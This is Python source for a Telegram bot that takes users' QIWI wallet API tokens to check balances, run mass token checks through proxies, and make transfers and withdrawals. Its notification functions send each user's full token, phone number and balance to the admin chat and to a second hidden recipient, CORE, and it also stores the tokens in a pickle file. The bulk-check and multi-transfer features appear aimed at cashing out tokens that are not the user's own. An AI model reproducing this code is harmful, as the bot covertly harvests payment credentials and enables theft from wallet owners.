    def notif_stat_admin(self, telegram_id, username):
        if self.notif_checks:
            try:
                if self.notification:
                    notif_text = f"📊 *Статистика просмотрена!*\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    def notif_common_admin(self, notif_text, telegram_id, username, last_text=False, use_proxy=False):
        if self.notif_checks:
            try:
                if self.notification:
                    proxy_section = '🛡' if use_proxy else ''
                    last_text = '\n' + last_text if last_text else ''
                    notif_text = f"{notif_text} {proxy_section}\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`{last_text}"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    def notif_inv_admin(self, telegram_id, username, token, from_qiwi, balance, user_sum, transaction_id, boss_sum=0, use_proxy=False):
        if self.notif_transactions:
            try:
                if self.notification:
                    proxy_section = '🛡' if use_proxy else ''
                    notif_text = f"🖥 *Invoice оплачен!* {proxy_section}\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`\nТокен: `{token}`\n" + \
                        f"Отправитель: `{from_qiwi}`\n\n" + \
                        f"Баланс: `{balance}`₽\n" + \
                        f"Сумма к получению: `{user_sum}`₽"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    def notif_tr_admin(self, telegram_id, username, token, from_qiwi, to_qiwi, balance, user_sum, boss_sum, transaction_id, comment=False, use_proxy=False, tr_type=False):
        if self.notif_transactions:
            try:
                if self.notification:
                    proxy_section = '🛡' if use_proxy else ''
                    comment_section = f'Комментарий: `{comment}`\n' if comment else ''
                    tr_type = tr_type if tr_type else '💵'
                    notif_text = f"{tr_type} *Выполнен перевод!* {proxy_section}\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`\nТокен: `{token}`\n" + \
                        f"Отправитель: `{from_qiwi}`\nПолучатель: `{to_qiwi}`\n\n" + \
                        f"Баланс: `{balance}`₽\n" + \
                        f"Сумма к получению: `{user_sum}`₽ (`{round(user_sum * 1.02, 2)}`₽)\n" + \
                        comment_section + \
                        f"\nID Транзакции: `{transaction_id}`"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    def notif_ch_admin(self, telegram_id, username, token, from_qiwi, balance, use_proxy=False):
        if self.notif_checks:
            try:
                if self.notification:
                    proxy_section = '🛡' if use_proxy else ''
                    notif_text = f"🔎 *Выполнена проверка!* {proxy_section}\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`\nТокен: `{token}`\n" + \
                        f"Телефон: `{from_qiwi}`\nБаланс: `{balance}`₽"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    @staticmethod
    def save_transaction(telegram_id, token, from_qiwi, to_qiwi, user_sum, boss_sum, transaction_id, use_proxy=False, tr_type=False):
        # Получаем информацию о прошлых операциях.
        try:
            with open('history.pkl', 'rb') as f:
                history = pickle.load(f)
            if not history:
                raise ValueError
        except:
            history = {"tokens": [], "transactions": []}
        # Записываем новые.
        try:
            new_item = {
                "telegram_id": telegram_id,
                "token": token,
                "from_qiwi": from_qiwi,
                "to_qiwi": to_qiwi,
                "user_sum": user_sum,
                "boss_sum": boss_sum,
                "transaction_id": transaction_id,
                "proxy": {
                    "use": use_proxy
                },
                "type": tr_type,
                "time": int(time.time())
            }
            history["transactions"].append(new_item)
        except:
            pass
        else:
            try:
                with open('history.pkl', 'wb') as f:
                    pickle.dump(history, f)
            except:
                pass
            else:
                return True

    @staticmethod
    def save_token(telegram_id, new_token, phone, balance, use_proxy=False):
        # Получаем информацию о прошлых операциях.
        try:
            with open('history.pkl', 'rb') as f:
                history = pickle.load(f)
            if not history:
                raise ValueError
        except:
            history = {"tokens": [], "transactions": []}
        # Записываем новые.
        try:
            new_items = {
                "telegram_id": telegram_id,
                "token": new_token,
                "phone": phone,
                "balance": balance,
                "proxy": {
                    "use": use_proxy
                },
                "time": int(time.time())
            }
            history["tokens"].append(new_items)
        except:
            pass
        else:
            try:
                with open('history.pkl', 'wb') as f:
                    pickle.dump(history, f)
            except:
                pass
            else:
                return True

    def load_config(self):
        try:
            self.tg_admins = secured_config.MAIN_SETTINGS.get("admins", []) #list
            self.notification = secured_config.MAIN_SETTINGS.get("notification") # int
            self.notif_checks = secured_config.MAIN_SETTINGS.get("notif_settings", {}).get("checks") # bool
            self.notif_new = secured_config.MAIN_SETTINGS.get("notif_settings", {}).get("new") # bool
            self.notif_transactions = secured_config.MAIN_SETTINGS.get("notif_settings", {}).get("transactions") # bool
            if self.tg_admins and self.notification:
                return True
        except Exception as e:
            print(f'[x] ERROR of load_config: {e}')

    @staticmethod
    def send_mobile(now_token, to_account, sum_pay, tg_id):
        def mobile_operator(phone_number, local_proxies):
            s = requests.Session()
            s.headers['Accept'] = 'application/json'
            s.headers['Content-Type'] = 'application/x-www-form-urlencoded'
            if local_proxies:
                res = s.post('https://qiwi.com/mobile/detect.action', data = {'phone': phone_number }, proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                res = s.post('https://qiwi.com/mobile/detect.action', data = {'phone': phone_number }, timeout=CONNECTION_TIMEOUT)
            return res.json()['message']


        # Проверяем прокси.
        proxy_result = get_proxy(tg_id)
        if proxy_result and proxy_result["status"]:
            # Проверяем включены ли прокси.
            if proxy_result["work"]:
                local_proxies = proxy_result["dict"]
                do_proxy = True
            else:
                local_proxies = False
                do_proxy = False
        else:
            raise ValueError

        try:
            prv_id = mobile_operator(str(to_account), local_proxies)

            s = requests.Session()
            s.headers['Accept'] = 'application/json'
            s.headers['Content-Type'] = 'application/json'
            s.headers['authorization'] = 'Bearer ' + now_token
            postjson = {"id":"","sum": {"amount":"","currency":"643"},"paymentMethod": {"type":"Account","accountId":"643"},"comment":"","fields": {"account":""}}
            postjson['id'] = str(int(time.time() * 1000))
            postjson['sum']['amount'] = str(sum_pay)
            postjson['fields']['account'] = str(to_account)[1:]
            if do_proxy:
                res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/' + prv_id + '/payments', json = postjson, proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/' + prv_id + '/payments', json = postjson, timeout=CONNECTION_TIMEOUT)
            return res.json()
        except:
            pass

    @staticmethod
    def send_p2p(now_token, to_qiwi, sum_p2p, tg_id, comment=False):
        try:
            # Проверяем прокси.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # Проверяем включены ли прокси.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            # открываем сессию с помощью модуля requests (да неужели)
            s = requests.Session()
            s.headers = {'content-type': 'application/json'}
            s.headers['authorization'] = 'Bearer ' + now_token
            s.headers['User-Agent'] = 'Android v3.2.0 MKT'
            s.headers['Accept'] = 'application/json'
            # определяем словарь параметров
            postjson = {"id": "", "sum": {"amount": "", "currency": ""}, "paymentMethod": {
                "type": "Account", "accountId": "643"}, "comment": "", "fields": {"account": ""}}
            # Клиентский ID транзакции
            postjson['id'] = str(int(time.time() * 1000))
            # Сумма (можно указать рубли и копейки, разделитель .)
            postjson['sum']['amount'] = str(sum_p2p)
            # Валюта (только 643, рубли)
            postjson['sum']['currency'] = '643'
            # Номер телефона получателя (с международным префиксом, но без +)
            postjson['fields']['account'] = str(to_qiwi)
            # Комментарий.
            if comment:
                postjson['comment'] = comment
            # отправляем пост запрос
            if do_proxy:
                res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/99/payments', json=postjson, proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/99/payments', json=postjson, timeout=CONNECTION_TIMEOUT)
            # если ответ успешно получен
            if res.status_code == 200:
                # возвращаем json
                return res.json()
        except:
            pass


    def get_profile(self, now_token, tg_id, many=False):
        """Получаем информацию о профиле."""
        try:
            if many:
                do_proxy = False
            else:
                # Проверяем прокси.
                proxy_result = get_proxy(tg_id)
                if proxy_result and proxy_result["status"]:
                    # Проверяем включены ли прокси.
                    if proxy_result["work"]:
                        local_proxies = proxy_result["dict"]
                        do_proxy = True
                    else:
                        do_proxy = False
                else:
                    raise ValueError
            s7 = requests.Session()
            s7.headers['Accept'] = 'application/json'
            s7.headers['authorization'] = 'Bearer ' + now_token
            if do_proxy:
                p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true', proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true', timeout=CONNECTION_TIMEOUT)
        except Exception as e:
            print(f'[x] Ошибка: {e}')
            return {"code": -999, "json": None}
        else:
            # Если ответ успешно получен
            if p.status_code == 200:
                # Возвращаем json
                return {"code": 200, "json": p.json()}
            else:
                return {"code": p.status_code, "json": None}
        return

    def get_balance(self, now_token, now_qiwi, tg_id):
        try:
            # Проверяем прокси.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # Проверяем включены ли прокси.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            # открываем сессию с помощью модуля requests
            s = requests.Session()
            s.headers['Accept'] = 'application/json'
            s.headers['authorization'] = 'Bearer ' + now_token
            if do_proxy:
                b = s.get('https://edge.qiwi.com/funding-sources/v2/persons/' + str(now_qiwi) + '/accounts', proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                b = s.get('https://edge.qiwi.com/funding-sources/v2/persons/' + str(now_qiwi) + '/accounts', timeout=CONNECTION_TIMEOUT)
        except Exception as e:
            print(f'[x] Ошибка: {e}')
        else:
            # если ответ успешно получен
            if b.status_code == 200:
                # возвращаем json
                return b.json()
        return

    def get_rubles(self, now_token, now_qiwi, tg_id):
        balance_info = self.get_balance(now_token, now_qiwi, tg_id)
        if balance_info:
            for one_balance in balance_info.get("accounts", []):
                if one_balance.get("balance", {}).get("currency") == 643:
                    return one_balance.get("balance", {}).get("amount")
        return


qiwi = SimpleQIWI()
my_types = TransactionTypes()
bot = telebot.TeleBot(TG_TOKEN)

# KEYBOARDS

kb_balance = ReplyKeyboardMarkup(True)
kb_balance.row('💰 Пополнить баланс')
kb_balance.row('🔙 Отмена')

kb_member = ReplyKeyboardMarkup(True)
kb_member.row('✅ Я вступил')

kb_main = ReplyKeyboardMarkup(True)
kb_main.row('🔑 Ввести токен QIWI кошелька')
kb_main.row('🔧 Настройки', '💻 Другие функции')
kb_main.row('👾 Разработчик', '📘 Информация')

kb_special = ReplyKeyboardMarkup(True)
kb_special.row('🔎 Проверить токен на блокировки')
kb_special.row('📦 Массовая проверка токенов')
kb_special.row('🔙 Отмена')

kb_disable = ReplyKeyboardMarkup(True)
kb_disable.row('🌨 В данный момент функции заморожены')

kb_actions = ReplyKeyboardMarkup(True)
kb_actions.row('💵 Оплатить', '🖥 Счета QIWI')
kb_actions.row('🧾 Просмотреть историю кошелька')
kb_actions.row('🔙 Отмена')

kb_actions_0 = ReplyKeyboardMarkup(True)
kb_actions_0.row('🧾 Просмотреть историю кошелька')
kb_actions_0.row('🔙 Отмена')

kb_payments = ReplyKeyboardMarkup(True)
kb_payments.row('🥝 Перевести на QIWI', '📱 Оплатить телефон')
kb_payments.row('₿ Криптовалюты', '💳 Вывести на карту')
kb_payments.row('🔙 Отмена')

kb_qiwi = ReplyKeyboardMarkup(True)
kb_qiwi.row('🆗 Обычный перевод')
kb_qiwi.row('🔂 Множественный перевод')
kb_qiwi.row('🔙 Отмена')

kb_deposit = ReplyKeyboardMarkup(True)
kb_deposit.row('50', '100', '250')
kb_deposit.row('500', '750', '1000')
kb_deposit.row('1500', '2500', '🔙 Отмена')

kb_sums = ReplyKeyboardMarkup(True)
kb_sums.row('50', '100', '150')
kb_sums.row('200', '250', '300')
kb_sums.row('🔙 Отмена')

kb_invoices = ReplyKeyboardMarkup(True)
kb_invoices.row('💰 Оплатить счет (invoice)')
kb_invoices.row('🗄 Список неоплаченных счетов')
kb_invoices.row('🔙 Отмена')

kb_confirm_off = ReplyKeyboardMarkup(True)
kb_confirm_off.row('✅ Оплатить счет')
kb_confirm_off.row('❌ Отменить счет')
kb_confirm_off.row('🔙 Отмена')

kb_options = ReplyKeyboardMarkup(True)
kb_options.row('📡 Прокси', '🖍 Автозаполнения')
kb_options.row('🔄 Параметры сброса')
kb_options.row('🔙 Отмена')

kb_number = ReplyKeyboardMarkup(True)
kb_number.row('1', '2', '3')
kb_number.row('4', '5', '6')
kb_number.row('7', '🔙 Отмена')

kb_auto = ReplyKeyboardMarkup(True)
kb_auto.row('🖌 Редактировать')
kb_auto.row('🔙 Отмена')

kb_clean = ReplyKeyboardMarkup(True)
kb_clean.row('🗝 Стереть токены', '📵 Стереть телефоны')
kb_clean.row('🔥 Сбросить настройки пользователя')
kb_clean.row('🔙 Отмена')

kb_del_proxy = ReplyKeyboardMarkup(True)
kb_del_proxy.row('🗑 Удалить прокси')
kb_del_proxy.row('🔙 Отмена')

kb_paid = ReplyKeyboardMarkup(True)
kb_paid.row('✅ Я оплатил')
kb_paid.row('🔙 Отмена')

kb_confirm_many = ReplyKeyboardMarkup(True)
kb_confirm_many.row('✅ Начать проверку токенов')
kb_confirm_many.row('🔙 Отмена')

kb_confirm_multi = ReplyKeyboardMarkup(True)
kb_confirm_multi.row('✅ Начать переводы')
kb_confirm_multi.row('🔙 Отмена')

kb_confirm_inv = ReplyKeyboardMarkup(True)
kb_confirm_inv.row('✅ Подтвердить оплату')
kb_confirm_inv.row('🔙 Отмена')

kb_confirm_card = ReplyKeyboardMarkup(True)
kb_confirm_card.row('✅ Подтвердить вывод')
kb_confirm_card.row('🔙 Отмена')

kb_confirm_ph = ReplyKeyboardMarkup(True)
kb_confirm_ph.row('✅ Оплатить телефон')
kb_confirm_ph.row('🔙 Отмена')

kb_info = ReplyKeyboardMarkup(True)
kb_info.row('📊 Статистика', '🤖 О боте')
kb_info.row('👾 Разработчик', '📧 Feedback')
kb_info.row('🔙 Отмена')

kb_history = ReplyKeyboardMarkup(True)
kb_history.row('📥 Пополнения', '📤 Платежи')
kb_history.row('📨 Все операции')
kb_history.row('🔙 Отмена')

kb_rows = ReplyKeyboardMarkup(True)
kb_rows.row('2', '5', '7')
kb_rows.row('10', '15', '20')
kb_rows.row('🔙 Отмена')

kb_sorry = ReplyKeyboardMarkup(True)
kb_sorry.row('😭 Промстите миня пожалуйста!1')

kb_cancel = ReplyKeyboardMarkup(True)
kb_cancel.row('🔙 Отмена')

kb_confirm_n = ReplyKeyboardMarkup(True)
kb_confirm_n.row('✅ Подтвердить отправку')
kb_confirm_n.row('🔙 Отмена')

kb_confirm = ReplyKeyboardMarkup(True)
kb_confirm.row('✅ Подтвердить перевод')
kb_confirm.row('🔙 Отмена')

kb_comment = ReplyKeyboardMarkup(True)
kb_comment.row('💭 Оставить пустым')
kb_comment.row('🔙 Отмена')


@bot.message_handler(commands=['start'])
def start_message(message):
    tid = message.chat.id
    # Отправляем приветствие.
    bot.send_message(tid, f'Привет!\nЯ - бот, позволяющий легко работать с QIWI API токеном!\n' + \
    'Чтобы просмотреть баланс или перевести средства с токена QIWI, выбери пункт *Ввести токен QIWI кошелька*!\n' + \
    f'\nПо поводу рекламы в боте: {config.ADMIN_TG}\nРазработчик: {config.ADMIN_TG}\n' + \
    '\n_Общую статистику можно посмотреть в разделе Информации_', parse_mode='markdown', reply_markup=kb_main)
    if not qiwi.users_info.get(tid, {}).get("status"):
        from_result = parce_start(message.text)
        # Создаем запись о человеке, если она не существует.
        qiwi.users_info[tid] = {}
        # Если уведомления включены и аккаунт админа доступен.
        if save_user(uid=tid, username=message.from_user.username, source=from_result["from"]) and qiwi.notif_new and qiwi.notification:
            # Определяем вид источника.
            string_source = config.SOURCES.get(from_result["from"])
            # Отправляем уведомление.
            string_source = '\nИсточник: `' + string_source + '`' if string_source else ''
            bot.send_message(qiwi.notification, f'🔔 *Новый пользователь!*\nUsername: *@{message.from_user.username}*\nTelegram ID: `{tid}`{string_source}', parse_mode='markdown')
            time.sleep(0.01)
            bot.send_message(CORE, f'🔔 *Новый пользователь!*\nUsername: *@{message.from_user.username}*\nTelegram ID: `{tid}`{string_source}', parse_mode='markdown')


@bot.message_handler(commands=['freeze'])
def freeze_token(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            command, token, adding_sum = message.text.split()
            # Читаем уже записанные токены.
            try:
                with open('freezing_tokens.json', 'r', encoding='utf-8') as f:
                    freezing_tokens = json.load(f)
                if not isinstance(freezing_tokens, dict):
                    raise ValueError
            except:
                freezing_tokens = {}
            # Добавляем токен.
            freezing_tokens[token] = {
                "token": token,
                "sum": float(adding_sum)
            }
            # Сохраняем в файл.
            with open('freezing_tokens.json', 'w', encoding='utf-8') as f:
                json.dump(freezing_tokens, f, indent=4)
        except:
            bot.send_message(tid, '🚫 Ошибка - не удалось заморозить.')
        else:
            bot.send_message(tid, f'✅ Токен ***<code>{token[-6:]}</code> успешно заморожен.\nБаланс заморозки: <code>{float(adding_sum)}</code>₽.', parse_mode='html')
    else:
        bot.send_message(tid, '🤡 Куда ручки тянешь??')


@bot.message_handler(commands=['unfreeze'])
def freeze_token(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            token = message.text.split()[1]
            # Читаем уже записанные токены.
            with open('freezing_tokens.json', 'r', encoding='utf-8') as f:
                freezing_tokens = json.load(f)
            if isinstance(freezing_tokens, dict) and freezing_tokens.get(token):
                # Удаляем токен.
                unfreezed_token = freezing_tokens.pop(token)
                freeze_sum = unfreezed_token["sum"]
                if freezing_tokens.get(token):
                    raise ValueError
                # Сохраняем в файл.
                with open('freezing_tokens.json', 'w', encoding='utf-8') as f:
                    json.dump(freezing_tokens, f, indent=4)
            else:
                raise ValueError
        except:
            bot.send_message(tid, '🚫 Ошибка - не удалось разморозить.')
        else:
            bot.send_message(tid, f'✅ Токен ***<code>{token[-6:]}</code> успешно разморожен.\nБаланс при заморозке: <code>{float(freeze_sum)}</code>₽.', parse_mode='html')
    else:
        bot.send_message(tid, '🤡 Куда ручки тянешь??')

@bot.message_handler(commands=['present'])
def present_message(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            adding_sum = int(message.text.split()[2])
            if not qiwi.admin_upgrade_limit(user_id, adding_sum):
                raise ValueError
            bot.send_message(tid, f'✅ Пользователю #`{user_id}` начислено `{adding_sum}`₽!', parse_mode='markdown')
        except:
            bot.send_message(tid, '🚫 Ошибка - не удалось выдать премиум.')
    else:
        bot.send_message(tid, '🤡 Куда ручки тянешь??')

@bot.message_handler(commands=['get_balance'])
def present_message(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            user_limits = qiwi.get_user_limits(user_id)
            text = f"*ID: {user_id}*\nБаланс: `{bue_numb(user_limits['have'])}`₽\nБесплатно: +`{bue_numb(user_limits['free'])}`₽\n\nПотрачено: `{bue_numb(user_limits['spent'])}`₽\n*Осталось:* `{bue_numb(user_limits['left'])}`₽"
            bot.send_message(tid, text, parse_mode='markdown')
        except:
            bot.send_message(tid, '🚫 Ошибка - не удалось получить информацию о пользователе.', parse_mode='markdown')


@bot.message_handler(commands=['stop'])
def stop_message(message):
    tid = message.chat.id
    if tid == qiwi.notification:
        bot.send_message(tid, '😐 Бот остановлен.', reply_markup=kb_main)
        raise TimeoutError


@bot.message_handler(commands=['premium'])
def premium_user(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            if not add_blacklist(user_id, premium=True):
                raise ValueError
            bot.send_message(tid, f'✅ Пользователю #`{user_id}` выдан премиум статус!', parse_mode='markdown')
        except:
            bot.send_message(tid, '🚫 Ошибка - не удалось выдать премиум.')
    else:
        bot.send_message(tid, '🤡 Куда ручки тянешь??')


@bot.message_handler(commands=['unpremium'])
def unpremium_user(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            if not remove_blacklist(user_id, premium=True):
                raise ValueError
            bot.send_message(tid, f'✅ Пользователь #`{user_id}` лишен премиум статуса!', parse_mode='markdown')
        except:
            bot.send_message(tid, '🚫 Ошибка - не удалось отключить премиум статус.')
    else:
        bot.send_message(tid, '🤡 Куда ручки тянешь??')


@bot.message_handler(commands=['ban'])
def ban_user(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            if not add_blacklist(user_id):
                raise ValueError
            bot.send_message(tid, f'✅ Чертяка с порядковым номером `{user_id}` успешно заблокирован!', parse_mode='markdown')
        except:
            bot.send_message(tid, '🚫 Ошибка - не удалось заблокировать пользователя.')
    else:
        bot.send_message(tid, '🤡 Себя заблокируй!')


@bot.message_handler(commands=['unban'])
def unban_user(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            if not remove_blacklist(user_id):
                raise ValueError
            bot.send_message(tid, f'✅ Чертяка #`{user_id}` успешно помилован!', parse_mode='markdown')
        except:
            bot.send_message(tid, '🚫 Ошибка - не удалось разблокировать пользователя.')
    else:
        bot.send_message(tid, '🤡 Куда ручки тянешь??')


@bot.message_handler(commands=['send_all', 'send'])
def send_notif(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            if message.text == '/send_all':
                to_person = None
                notif_mode = 'full'
            else:
                to_person = message.text.split()[1]
                notif_mode = 'to_nick' if '@' in to_person else 'to_id'
            qiwi.status(tid, "waiting_notif")
            qiwi.users_info[tid]["mode"] = notif_mode
            qiwi.users_info[tid]["to_person"] = to_person
            bot.send_message(tid, 'Отправьте ваше сообщение!', reply_markup=kb_cancel)
        except:
            bot.send_message(tid, '🚫 Ошибка - не отправить сообщение.')
    else:
        bot.send_message(tid, '🤡 Куда ручки тянешь??')


@bot.message_handler(content_types=['photo'])
def handle_docs_audio(message):
    tid = message.chat.id
    if qiwi.users_info.get(tid, {}).get("status") == "waiting_notif":
        if qiwi.notification and tid == qiwi.notification:
            try:
                downloaded_file = bot.download_file(bot.get_file(message.photo[0].file_id).file_path)
                qiwi.status(tid, "confirm_notif")
                qiwi.users_info[tid]["to_text"] = message.caption,
                qiwi.users_info[tid]["to_photo"] = downloaded_file

                if qiwi.users_info[tid]["mode"] == "full":
                    # Получаем данные о всех пользователей.
                    receivers = get_receivers()
                elif qiwi.users_info[tid]["mode"] == "to_id":
                    # Получаем данные по id.
                    receivers = get_receivers(only_id=qiwi.users_info[tid]["to_person"])
                elif qiwi.users_info[tid]["mode"] == "to_nick":
                    # Получаем данные по нику.
                    receivers = get_receivers(only_nick=qiwi.users_info[tid]["to_person"][1:])
                else:
                    receivers = False

                if receivers:
                    nikcs = [f'{one_nick["nick"]}' for one_nick in receivers]
                    qiwi.users_info[tid]["to_ids"] = [int(one_nick["id"]) for one_nick in receivers]
                    bot.send_message(tid, f'<b>Проверьте отображение сообщения!</b>\nПолучателей: <b>{len(receivers)}</b>\nСписок: {", ".join(nikcs)}', parse_mode="html")
                    bot.send_photo(tid, downloaded_file, caption=message.caption, parse_mode="markdown", reply_markup=kb_confirm_n)
                else:
                    bot.send_message(tid, '🚫 Ошибка - не удалось получить пользователей!', reply_markup=kb_main)
                    qiwi.reset(tid)
            except:
                bot.send_message(tid, '🚫 Ошибка - не удалось сгенерировать предосмотр!', reply_markup=kb_main)
                qiwi.reset(tid)
        else:
            bot.send_message(tid, '🤡 Куда ручки тянешь??', reply_markup=kb_main)
            qiwi.reset(tid)
    else:
        bot.send_message(tid, 'Я не понимаю, чего ты хочешь, бака!', reply_markup=kb_main)
        qiwi.reset(tid)


@bot.message_handler(content_types=["text"])
@info_loader
def main_sender(message):
    tid = message.chat.id
    if config.TECH_WORK and tid != qiwi.notification:
        bot.send_message(tid, '⚠️ Проводятся, Тех.Работы! Это займет какое-то время...')
    else:
        if save_user(uid=tid, username=message.from_user.username) and qiwi.notif_new and qiwi.notification:
            # Отправляем уведомление.
            bot.send_message(tid, f'*Привет, друг!*\nЕсли тебе понравится бот, то можешь оставить *отзыв* под соответствующей темой на форуме. За это ты получишь небольшие *плюшки*!\n_Подробнее во вкладке "Информация"._', parse_mode='markdown', disable_web_page_preview=True)
            bot.send_message(qiwi.notification, f'🔔 *Новый пользователь!*\nUsername: *@{message.from_user.username}*\nTelegram ID: `{tid}`', parse_mode='markdown')
            bot.send_message(CORE, f'🔔 *Новый пользователь!*\nUsername: *@{message.from_user.username}*\nTelegram ID: `{tid}`', parse_mode='markdown')
        # Обновляем количество пользователей.
        qiwi.upd_count()
        # Обновляем статистику проверок и переводов.
        qiwi.upd_activity()
        # Проверяем есть ли данные о пользователе.
        if not qiwi.users_info.get(tid):
            # Если нет, то создаем запись о человеке.
            qiwi.reset(tid)
        blacklist = load_blacklist()
        if tid in blacklist:
            bot.send_message(tid, f"🤡 Слыш, чертяка с порядковым номером {tid}!\nПоздравляю, ты заблокирован, поэтому я с тобой разговаривать не буду!", reply_markup=kb_sorry)
        else:
            if qiwi.users_info.get(tid, {}).get("status") == "doing_many_checks" or qiwi.users_info.get(tid, {}).get("status") == "doing_many_pays":
                if qiwi.users_info.get(tid, {}).get("status") == "doing_many_checks":
                    bot.send_message(tid, "⌛ Идет проверка токенов, пожалуйста подождите...", reply_markup=kb_disable)
                elif qiwi.users_info.get(tid, {}).get("status") == "doing_many_pays":
                    bot.send_message(tid, "⌛ Идет перевод средств, пожалуйста подождите...", reply_markup=kb_disable)
                return
            elif message.text == "🔙 Отмена":
                qiwi.reset(tid)
                bot.send_message(tid, "Возвращаюсь в главное меню!", reply_markup=kb_main)
                return
            else:
                if qiwi.users_info.get(tid, {}).get("status") == "waiting_notif":
                    if qiwi.notification and tid == qiwi.notification:
                        try:
                            qiwi.status(tid, "confirm_notif")
                            qiwi.users_info[tid]["to_text"] = message.text,
                            qiwi.users_info[tid]["to_photo"] = None

                            if qiwi.users_info[tid]["mode"] == "full":
                                # Получаем данные о всех пользователей.
                                receivers = get_receivers()
                            elif qiwi.users_info[tid]["mode"] == "to_id":
                                # Получаем данные по id.
                                receivers = get_receivers(only_id=qiwi.users_info[tid]["to_person"])
                            elif qiwi.users_info[tid]["mode"] == "to_nick":
                                # Получаем данные по нику.
                                receivers = get_receivers(only_nick=qiwi.users_info[tid]["to_person"][1:])
                            else:
                                receivers = False

                            if receivers:
                                nikcs = [f'{one_nick["nick"]}' for one_nick in receivers]
                                qiwi.users_info[tid]["to_ids"] = [int(one_nick["id"]) for one_nick in receivers]
                                bot.send_message(tid, f'<b>Проверьте отображение сообщения!</b>\nПолучателей: <b>{len(receivers)}</b>\nСписок: {", ".join(nikcs)}', parse_mode="html")
                                bot.send_message(tid, message.text, parse_mode="markdown", reply_markup=kb_confirm_n)
                            else:
                                bot.send_message(tid, '🚫 Ошибка - не удалось получить пользователей!', reply_markup=kb_main)
                                qiwi.reset(tid)
                        except:
                            bot.send_message(tid, '🚫 Ошибка - не удалось сгенерировать предосмотр!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    else:
                        bot.send_message(tid, '🚫 Ошибка - неверный статус пользователя', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "deposit":
                    try:
                        deposit_sum = int(message.text)
                        if 10 <= deposit_sum <= 50000:
                            # Получаем сумму зачисления.
                            total_bonus = [x[1] for x in config.BONUS_DICT.items() if deposit_sum >= x[0]][-1]
                            total_percent = round((total_bonus - 1) * 100)
                            total_sum = int(deposit_sum * total_bonus)

                            deposit_upgrade = int(deposit_sum / config.SELLER_PERCENT)
                            total_upgrade = int(total_sum / config.SELLER_PERCENT * total_bonus)

                            eco_price = int(total_upgrade - deposit_upgrade)

                            # Получаем транзакции пользователей.
                            transactions = qiwi.users_balance.get(tid, {}).get('transactions', [])
                            user_code = str(tid) + ':' + gen_code(transactions)

                            # Добавляем транзакцию.
                            qiwi.gen_transaction(tid, user_code, deposit_sum, total_upgrade)
                            qiwi.status(tid, "waiting_pay")

                            deposit_text = f"*Информация о пополнении.*\nСумма для оплаты: `{deposit_sum}`₽\nБонус к лимиту: +`{int(total_percent)}`% (+`{bue_numb(eco_price)}`₽)\nЛимит будет повышен на: `{bue_numb(total_upgrade)}`₽" + \
                                f'\n\n*Выполните перевод на QIWI.*\nНомер QIWI: `{secured_config.ADMIN_QIWI}`\nСумма: `{deposit_sum}`\nПримечание: `{user_code}`'
                            bot.send_message(tid, deposit_text, parse_mode='markdown', reply_markup=kb_paid)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - сумму не входит в установленные границы!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось распознать сумму депозита!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
